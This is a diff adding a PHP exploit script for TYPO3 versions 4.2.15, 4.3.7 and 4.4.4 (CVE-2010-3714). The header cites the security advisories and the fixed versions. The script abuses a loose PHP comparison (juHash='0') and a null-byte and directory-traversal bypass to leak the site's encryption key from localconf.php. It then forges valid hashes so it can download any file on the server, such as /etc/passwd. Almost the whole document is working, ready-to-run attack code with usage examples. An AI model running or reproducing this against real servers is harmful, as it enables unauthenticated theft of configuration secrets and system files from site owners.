@@ -1,0 +1,170 @@
+<?php
+/* TYPO3-SA-2010-022.php
+ * Exploit Title: TYPO3 Unauthenticated Arbitrary File Retrieval (TYPO3-SA-2010-020, TYPO3-SA-2010-022)
+ * Date: 29/12/2010
+ * Author: ikki
+ * Software Link: http://typo3.org/download/, http://sourceforge.net/projects/typo3/files/ 
+ * Version: 4.2.15, 4.3.7 or 4.4.4
+ * Tested on: php
+ * CVE : CVE-2010-3714 (non-typesafe comparison flaw), n/a (fileDenyPattern bypass)
+ * A demonstration video for this vulnerability is also available here: http://www.ikkisoft.com/stuff/TYPO3-SA-2010-020_video.htm
+ *
+ * @_ikki
+ * 
+ * TYPO3 Unauthenticated Arbitrary File Retrieval (TYPO3-SA-2010-020, plus TYPO3-SA-2010-022)
+ * 
+ * Exploiting a non-typesafe comparison flaw, a remote aggressor can access arbitrary files
+ * on a vulnerable system. Authentication is not required to exploit this vulnerability.
+ * Moreover, a "fileDenyPattern" bypass has been implemented in order to speed up the attack. 
+ *
+ * References:
+ * - http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-020/
+ * - http://bugs.typo3.org/view.php?id=15898
+ * - http://php.net/manual/en/language.operators.comparison.php
+ * - http://blog.nibblesec.org/2010/12/unspecified-vulnerabilities.html ("least disclosure" rant)
+ *
+ * Fix: Update to the TYPO3 versions 4.2.16, 4.3.9, 4.4.5 or newer
+ * Credits: Gregor Kopf for finding the neat non-typesafe comparison flaw, Micha? Trojnara for his daily tips 
+ */
+
+define("VERSION","0.2");
+/* v0.2
+ * - HTTP and HTTPS support (without verifying the peer's certificate)
+ * - File retrieval, just after the initial encryption key disclosure 
+ * - Proxy support
+ * - (Dirty) multi requests support (using curl multi_requests)
+ * - Preliminary checks 
+ */ 
+define("DEBUG",FALSE);
+if(!defined("STDIN")) define("STDIN", fopen('php://stdin','r'));
+if(!defined("STDERR")) define("STDERR", fopen('php://stderr','r'));
+
+/* Turn on/off all error reporting */
+DEBUG ? error_reporting(E_ALL) : error_reporting(0); 
+set_time_limit(0);
+
+/* Main */
+echo("\n\n :: [ TYPO3-SA-2010-022.php v".VERSION." ] :: \n\n");
+
+if($argc=="3"){
+	$typo=$argv[1];
+	$reqs=$argv[2]; //Uwaga! Too many requests may even slow down the attack
+}else if($argc=="4"){
+ 	$typo=$argv[1];
+ 	$reqs=$argv[2]; //Uwaga! Too many requests may even slow down the attack
+ 	$proxy=$argv[3];
+}else{
+ 	echo "Usage: php ".$argv[0]." TYPO3ValidURL ParallelRequests (Proxy)\n\n";
+ 	echo "Examples:\r\n";
+ 	echo "php ".$argv[0]." http://127.0.0.1/index.php?id=2 9\n";
+ 	echo "php ".$argv[0]." https://127.0.0.1/index.php?id=15 9\n";
+ 	echo "php ".$argv[0]." http://127.0.0.1:8080/index.php?id=223 12\n";
+ 	echo "php ".$argv[0]." http://127.0.0.1/index.php?id=223 12 http://127.0.0.1:8181\n\n";
+ 	exit;
+}
+
+$url=substr($typo,0,strpos($typo,"id=")-1);
+$id=substr($typo,strpos($typo,"id=")+3);
+$locationData=$id.":";
+$jumpurl="typo3conf/ext/../localconf.php%00"; //Null byte and directory move up trick the fileDenyPattern mechanism
+$juHash="0"; // "0" is a numeric string, converted internally to 0 (int) by PHP during comparisons
+
+/* STEP 1 - Check the remote TYPO3 installation */
+$ch=curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+DEBUG ? curl_setopt($ch, CURLOPT_VERBOSE, TRUE):curl_setopt($ch, CURLOPT_VERBOSE, FALSE);
+curl_setopt($ch, CURLOPT_POST, 1);
+if(isset($proxy)){
+ 	curl_setopt($ch, CURLOPT_PROXY, $proxy);
+}
+curl_setopt($ch, CURLOPT_POSTFIELDS,"id=".$id."&type=0&jumpurl=".$jumpurl."&juSecure=1&locationData=".$locationData."&juHash=".$juHash);
+$output=curl_exec($ch);
+
+if(stristr($output,"did not match")) {
+	echo("[*] TYPO3 successfully detected!\n");
+}else{
+	echo("[!] A problem occurred while detecting the remote TYPO3 installation\n");
+	exit;
+}
+curl_close ($ch);
+
+/* STEP 2 - Retrieve $TYPO3_CONF_VARS['SYS']['encryptionKey'] from /typo3conf/localconf.php */
+$mh = curl_multi_init();
+$handles = array();
+$location = $locationData; //locationData with padding
+
+for($i=0;$i<$reqs;$i++){
+		$ch = curl_init(); //create a new single curl handle
+    	curl_setopt($ch, CURLOPT_URL, $url);
+    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
+    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+    	curl_setopt($ch, CURLOPT_POST, 1);
+    	if(isset($proxy)){
+			curl_setopt($ch, CURLOPT_PROXY, $proxy);
+    	}
+    	$location = "%20".$location;
+    	curl_setopt($ch, CURLOPT_POSTFIELDS,"id=".$id."&type=0&jumpurl=".$jumpurl."&juSecure=1&locationData=".$location."&juHash=".$juHash);
+
+    	curl_multi_add_handle($mh,$ch);
+    	$handles[] = $ch; // put the handles in an array to loop
+}
+
+echo("[*] Starting TYPO3's encryption key retrieval\n");
+echo("[*] Padding locationData to force '0exxxxxx' strings. It may take a while.");
+
+$rcont=0;
+while(!stristr($output,"TYPO3_CONF_VARS['SYS']['encryptionKey']")){
+	$running=null;
+  	do{
+		curl_multi_exec($mh,$running);
+  	} while ($running > 0);
+
+	for($i=0;$i<count($handles);$i++){
+		$output = curl_multi_getcontent($handles[$i]);
+    	$location="%20".$location;
+    	curl_multi_remove_handle($mh,$handles[$i]);
+    	curl_setopt($handles[$i], CURLOPT_POSTFIELDS,"id=".$id."&type=0&jumpurl=".$jumpurl."&juSecure=1&locationData=".$location."&juHash=".$juHash);
+    	curl_multi_add_handle($mh,$handles[$i]);
+		$rcont++;
+    	echo(".");
+  	}
+}
+
+curl_multi_remove_handle($mh,$handles[$i]); 
+curl_multi_close($mh);
+
+$key=substr($output,strpos($output,"TYPO3_CONF_VARS['SYS']['encryptionKey'] = '")+43);
+$key=substr($key,0,strpos($key,"';"));
+echo("\n[*] Done! ".$rcont." requests\n");
+echo("\n[*] TYPO3's encryption key:".$key."\n");
+
+/* STEP 3 - Retrieve arbitrary files */
+while(!0) {
+	echo("\n[*] Which file do you want to download?\n");
+	echo("[*] Please make your selection (e.g. '/etc/passwd'):\n\n");
+	$jumpurl=trim(fgets(STDIN,256));
+	/* Generate a valid hash as in the TYPO3 codebase*/ 	
+	$hArr= array($jumpurl,$locationData,$key);
+	$juHash=substr(md5(serialize($hArr)),0,10);;
+
+	$ch=curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+	DEBUG ? curl_setopt($ch, CURLOPT_VERBOSE, TRUE):curl_setopt($ch, CURLOPT_VERBOSE, FALSE);
+	curl_setopt($ch, CURLOPT_POST, 1);
+    if(isset($proxy)){
+ 		curl_setopt($ch, CURLOPT_PROXY, $proxy);
+    }
+	curl_setopt($ch, CURLOPT_POSTFIELDS,"id=".$id."&type=0&jumpurl=".$jumpurl."&juSecure=1&locationData=".$locationData."&juHash=".$juHash);
+	$output=curl_exec($ch);
+
+	echo("\n[*]------------------------------------------------------------------------------\n\n");
+	if(!stristr($output,"not a valid")) echo $output;
+	else echo("[!] An error occurred while retriving '".$jumpurl."'\n");
+	echo("\n\n[*]------------------------------------------------------------------------------\n");
+
+	curl_close ($ch);
+}
